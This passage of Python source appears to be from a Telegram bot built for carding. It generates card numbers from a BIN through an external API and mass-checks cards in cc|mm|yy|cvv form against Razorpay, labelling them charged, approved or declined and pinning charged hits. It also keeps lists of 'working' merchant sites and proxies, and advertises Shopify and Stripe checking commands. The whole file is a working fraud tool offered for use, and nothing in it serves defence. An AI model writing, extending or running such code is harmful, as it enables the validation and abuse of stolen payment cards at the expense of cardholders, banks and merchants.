    try: await status_msg.edit(final, buttons=buttons)
    except: pass

@client.on(events.CallbackQuery(data=b"check_db_sites"))
async def check_db_sites_callback(event):
    user_id = event.sender_id
    sites = await load_json(SITE_FILE)
    user_sites = sites.get(str(user_id), [])
    if not user_sites: return await event.answer("\u274c No sites saved!", alert=True)
    await event.answer("Starting check...", alert=False)
    asyncio.create_task(_process_db_check(event, user_sites, user_id))

async def _process_db_check(event, user_sites, user_id):
    total = len(user_sites); checked = 0; working = []; dead = []
    await event.edit(f"```Checking {total} DB sites...```")
    for site in user_sites:
        result = await test_single_site(site, user_id=user_id)
        checked += 1
        if result["status"] == "working": working.append(site)
        else: dead.append(site)
        try: await event.edit(f"```Checking DB [{checked}/{total}]\nWorking: {len(working)} | Dead: {len(dead)}```")
        except: pass
    if dead:
        sites_data = await load_json(SITE_FILE)
        sites_data[str(user_id)] = working
        await save_json(SITE_FILE, sites_data)
    final = f"\u2705 **DB Check Complete!**\n\nWorking: {len(working)} | Dead (removed): {len(dead)}"
    if working: final += "\n\n**Working:**\n" + "\n".join([f"\u2705 `{s}`" for s in working])
    if dead: final += "\n\n**Dead (removed):**\n" + "\n".join([f"\u274c `{s}`" for s in dead])
    try: await event.edit(final)
    except: pass

@client.on(events.CallbackQuery(pattern=rb"add_working:(\d+)"))
async def add_working_sites_callback(event):
    uid = int(event.pattern_match.group(1).decode())
    if event.sender_id != uid: return await event.answer("\u274c Not yours!", alert=True)
    working_sites = TEMP_WORKING_SITES.get(uid, [])
    if not working_sites: return await event.answer("\u274c No sites!", alert=True)
    sites_data = await load_json(SITE_FILE)
    user_sites = sites_data.get(str(uid), [])
    added = 0
    for site in working_sites:
        if site not in user_sites: user_sites.append(site); added += 1
    sites_data[str(uid)] = user_sites
    await save_json(SITE_FILE, sites_data)
    TEMP_WORKING_SITES.pop(uid, None)
    await event.answer(f"\u2705 Added {added} sites!", alert=True)

# --- /gen Card Generator ---

CC_GEN_ENDPOINT = "https://drlabapis.onrender.com/api/ccgenerator"

@client.on(events.NewMessage(pattern=r'(?i)^[/.]gen(?:\s|$)'))
async def gen(event):
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned": return await event.reply(banned_user_message())
    if not can_access: return await event.reply("\U0001f6ab Unauthorised!")
    try:
        args = event.raw_text.split()
        if len(args) < 2: return await event.reply("Usage: `/gen BIN amount`\nExample: `/gen 414720 10`")
        bin_input = args[1]
        count = int(args[2]) if len(args) > 2 and args[2].isdigit() else 10
        if count > 500: count = 500
        loading_msg = await event.reply("Generating...")
        timeout = aiohttp.ClientTimeout(total=30)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(f"{CC_GEN_ENDPOINT}?bin={bin_input}&count={count}") as res:
                if res.status != 200: return await loading_msg.edit(f"\u274c API Error: {res.status}")
                text = await res.text()
                cards = [l.strip() for l in text.strip().split('\n') if l.strip()]
        if not cards: return await loading_msg.edit("\u274c No cards generated")
        bin_clean = bin_input.replace("|", "").replace("x", "").replace("X", "")
        brand, bin_type, level, bank, country, flag = await get_bin_info(bin_clean[:6] + "0000000000")
        if len(cards) > 20:
            filename = f"gen_{event.sender_id}.txt"
            async with aiofiles.open(filename, "w") as f: await f.write("\n".join(cards))
            await loading_msg.delete()
            await event.reply(f"Generated {len(cards)} cards\nBIN: {bin_input}\n{brand} - {bank}\n{country} {flag}", file=filename)
            os.remove(filename)
        else:
            cards_text = "\n".join([f"`{c}`" for c in cards])
            await loading_msg.edit(f"**BIN:** `{bin_input}` | **Amount:** {len(cards)}\n\n{cards_text}\n\n{brand} - {bin_type} - {level}\n{bank}\n{country} {flag}")
    except Exception as e: await event.reply(f"\u274c Error: {e}")

# --- /cmds ---

@client.on(events.NewMessage(pattern=r'(?i)^[/.]cmds(?:\s|$)'))
async def cmds(event):
    text = """**Available Commands:**

**Shopify:** `/sh` `/msh` `/mtxt`
**Razorpay:** `/rzp` `/mrzp` `/rztxt`
**Stripe Auth:** `/au` `/mau` `/autxt`

**Sites:** `/add` `/rm` `/check` `/info`
**Proxy:** `/addpxy` `/proxy` `/rmpxy`
**Gen:** `/gen BIN amount`

**Admin:** `/auth` `/key` `/ban` `/unban` `/clear`"""
    await event.reply(text)

# --- /mrzp Mass Razorpay Check ---

@client.on(events.NewMessage(pattern=r'(?i)^[/.]mrzp(?:\s|$)'))
async def mrzp(event):
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned": return await event.reply(banned_user_message())
    if not can_access: return await event.reply("\U0001f6ab Unauthorised!")
    cards = []
    if event.reply_to_msg_id:
        replied_msg = await event.get_reply_message()
        if replied_msg and replied_msg.text: cards = extract_all_cards(replied_msg.text)
    else: cards = extract_all_cards(event.raw_text)
    if not cards: return await event.reply("Format: /mrzp cc|mm|yy|cvv cc|mm|yy|cvv ...")
    user_limit = get_cc_limit(access_type, event.sender_id)
    if len(cards) > user_limit: cards = cards[:user_limit]
    asyncio.create_task(_process_mrzp(event, cards))

async def _process_mrzp(event, cards):
    sent_msg = await event.reply(f"```Razorpay Checking \U0001f373 {len(cards)} Total.```")
    batch_size = 5
    for i in range(0, len(cards), batch_size):
        batch = cards[i:i+batch_size]
        tasks = [check_card_razorpay(card, user_id=event.sender_id) for card in batch]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        for card, result in zip(batch, results):
            if isinstance(result, Exception): result = {"Response": str(result), "Price": "-", "Gateway": "Razorpay"}
            brand, bin_type, level, bank, country, flag = await get_bin_info(card.split("|")[0])
            status_text = result.get("Status", "").lower()
            response_text = result.get("Response", "").lower()
            is_charged = False
            if "charged" in status_text: status_header = "CHARGED \U0001f48e"; is_charged = True
            elif "insufficient" in status_text or "insufficient" in response_text: status_header = "APPROVED \u2705"
            else: status_header = "~~ DECLINED ~~ \u274c"
            card_msg = f"{status_header}\n\nCC \u21fe `{card}`\nGateway \u21fe {result.get('Gateway')}\nResponse \u21fe {result.get('Response')}\n\n```BIN: {brand}-{bin_type}-{level}\nBank: {bank}\nCountry: {country} {flag}```"
            result_msg = await event.reply(card_msg)
            if is_charged: await pin_charged_message(event, result_msg)
            await asyncio.sleep(0.1)
    await sent_msg.edit(f"```\u2705 Razorpay Complete! {len(cards)} cards.```")

# --- Main ---

async def main():
    await initialize_files()
    print("BOT RUNNING \U0001f4a8")
    await client.start(bot_token=BOT_TOKEN)
    await client.run_until_disconnected()

if __name__ == "__main__":
    asyncio.run(main())
